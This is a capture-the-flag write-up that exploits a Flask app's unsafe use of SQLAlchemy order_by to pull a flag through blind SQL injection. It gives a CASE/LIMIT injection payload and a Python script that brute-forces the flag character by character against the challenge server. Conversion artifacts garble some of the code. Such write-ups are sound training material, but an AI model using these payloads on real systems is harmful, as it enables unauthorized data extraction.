<h1>Flaskmetal Alchemist</h1>

<p>We are given the following code:</p>

<p>```python
from flask import Flask, render<em>template, request, url</em>for, redirect
from models import Metal
from database import db<em>session, init</em>db
from seed import seed_db
from sqlalchemy import text</p>

<p>app = Flask(<strong>name</strong>)</p>

<p>@app.teardown<em>appcontext
def shutdown</em>session(exception=None):
    db_session.remove()</p>

<p>@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        search = ""
        order = None
        if "search" in request.form:
            search = request.form["search"]
        if "order" in request.form:
            order = request.form["order"]
        if order is None:
            metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
        else:
            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order<em>by(text(order))
        return render</em>template("home.html", metals=metals)
    else:
        metals = Metal.query.all()
        return render_template("home.html", metals=metals)</p>

<p>if <strong>name</strong> == "<strong>main</strong>":
    seed_db()
    app.run(debug=False)
```</p>

<p>Looking into the <code>requirements.txt</code> file, we see that a rather old version of SQLAlchemy is used.</p>

<p><code>python
click==8.1.2
Flask==2.1.1
importlib-metadata==4.11.3
itsdangerous==2.1.2
Jinja2==3.1.1
MarkupSafe==2.1.1
SQLAlchemy==1.2.17
Werkzeug==2.1.1
zipp==3.8.0
</code></p>

<p>This version is in fact vulnerable to <a href="https://github.com/sqlalchemy/sqlalchemy/issues/4481">an SQL injection vulnerability</a> in <code>order_by()</code>.</p>

<p>However, exploiting this is slightly more challenging as the injection point is after the <code>ORDER BY</code> clause - at this point, we won't be able to use things like <code>UNION</code>, <code>WHERE</code>, <code>OR</code>, <code>AND</code>, etc.</p>

<p>I came across this <a href="https://portswigger.net/support/sql-injection-in-the-query-structure">article</a> by PortSwigger where the <code>CASE</code> clause is used to determine which column the result is sorted by. We'd have to modify the payload into something that SQLite accepts - diving into the SQLite documentation showed us that the following was valid syntax:</p>

<p><code>sql
ORDER BY name LIMIT (CASE (SELECT hex(substr(flag,6,1)) FROM flag limit 1 offset 0) WHEN hex('5') THEN  1 ELSE 2 END)
</code></p>

<p>This payload will check the <code>flag</code> character at index 6. If it matches the character <code>5</code>, then the <code>LIMIT</code> is set to 1. Otherwise, the <code>LIMIT</code> is set to 2.</p>

<p>We could repeat this for each character of the flag:</p>

<p>```python
import requests</p>

<p>alphabet = '0123456789abcdefghijklmnopqrstuvwxyz_{}'
url = 'http://challenge.nahamcon.com:32142'</p>

<p>curr = 'flag{'
i = 6</p>

<p>done = False
while not done:</p>

<pre><code>found = False

for char in alphabet:
    print("Trying {}".format(curr + char))
    r = requests.post(url, data={
        'search': '',
        'order': f"name LIMIT (CASE (SELECT hex(substr(flag,{i},1)) FROM flag limit 1 offset 0) WHEN hex('{char}') THEN  1 ELSE 2 END)"
    })
    # print(r.headers['Content-length'])

    if int(r.headers['Content-length']) &lt; 3646:
        found = True
        curr += char
        i += 1
        print("[+] Found {}".format(curr))

if not found:
    break
</code></pre>

<p>```</p>
